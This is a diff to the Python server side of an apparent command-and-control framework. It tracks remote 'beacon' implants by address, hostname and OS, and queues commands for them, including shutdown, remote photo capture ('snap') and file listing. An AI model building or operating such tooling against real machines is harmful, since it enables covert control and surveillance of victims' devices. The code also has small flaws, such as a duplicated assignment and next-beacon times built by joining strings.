@@ -1,22 +1,45 @@
 from ServerDatabase.database import DatabaseClass
-from file_manager import FileManagerClass
+from .file_manager import FileManagerClass
 from .global_objects import (
-    add_beacon_command_list,
-    remove_beacon_list,
-    command_list
+    command_list,
+    beacon_list,
 )
 
-
+import uuid
 import colorama
+import json
+import traceback
 
 
-class BeaconCommandsClass:
+class beacon_command:
+    def __init__(self, command_uuid, beacon_uuid, command, command_output,
+                 executed, command_data):
+        self.command_uuid = command_uuid
+        self.beacon_uuid = beacon_uuid
+        self.command = command
+        self.command_output = command_output
+        self.executed = executed
+        self.command_data = command_data
+
+
+class Beacon:
     """Handles commands within a session"""
 
-    def __init__(self, uuid) -> None:
-        self.database = DatabaseClass()  
-        self.file_manager = FileManagerClass(uuid)
-        colorama.init(autoreset=True)  # resets colorama after each function
+    def __init__(self, uuid, address, hostname, operating_system,
+                 last_beacon, timer, jitter, config):       
+        self.uuid = uuid
+        self.database = DatabaseClass(config)  
+        self.file_manager = FileManagerClass()
+        self.uuid = uuid
+        self.address = address
+        self.hostname = hostname
+        self.operating_system = operating_system
+        self.last_beacon = last_beacon
+        self.next_beacon = str(last_beacon) + str(timer)
+        self.timer = timer
+        self.jitter = jitter
+        self.config = config
+        colorama.init(autoreset=True) 
 
     def close_connection(self, userID) -> None:
         """
@@ -35,7 +58,11 @@ class BeaconCommandsClass:
                 add_beacon_command_list(userID, None, "shutdown")
 
             except BaseException:  # handles ssl.SSLEOFError
+                if not self.config['server']['quiet_mode']:
+                    print(colorama.Fore.RED + "Traceback:")
+                    traceback.print_exc()
                 pass
+                    
             remove_beacon_list(userID)
 
             print(colorama.Back.GREEN + "Closed")
@@ -84,10 +111,10 @@ class BeaconCommandsClass:
 
     def takePhoto(self, userID) -> None:
         add_beacon_command_list(userID, None, "snap", "")
+        return
     
-    def list_files(self, ) -> None:
-
-        
+    def list_files(self, userID) -> None:
+        self.file_manager.list_files(userID)
 
     def list_db_commands(self, userID) -> None:
         for _, beacon_commands in command_list.items():
@@ -115,3 +142,31 @@ class BeaconCommandsClass:
                 break
         add_beacon_command_list(userID, None, "beacon_configuration", data)
         return
+
+
+def add_beacon_list(uuid: str, r_address: str, hostname: str,
+                    operating_system: str, last_beacon, timer,
+                    jitter, config) -> None:
+    new_beacon = Beacon(
+        uuid, r_address, hostname, operating_system, last_beacon, timer, jitter, config
+    )
+    beacon_list[uuid] = new_beacon
+
+
+def add_beacon_command_list(beacon_uuid: str, command_uuid: str,
+                            command: str, command_data: json = {}) -> None:
+    if not command_uuid or command_uuid == "":
+        command_uuid = str(uuid.uuid4())
+    new_command = beacon_command(command_uuid, beacon_uuid,
+                                 command, "", False, command_data)
+    command_list[command_uuid] = new_command
+
+
+def remove_beacon_list(uuid: str) -> None:
+    """
+    Removes beacon from the global beacon dictionary.
+    """
+    if uuid in beacon_list:
+        beacon_list.pop(uuid)
+    else:
+        print(f"Beacon {uuid} not found in beacon list")
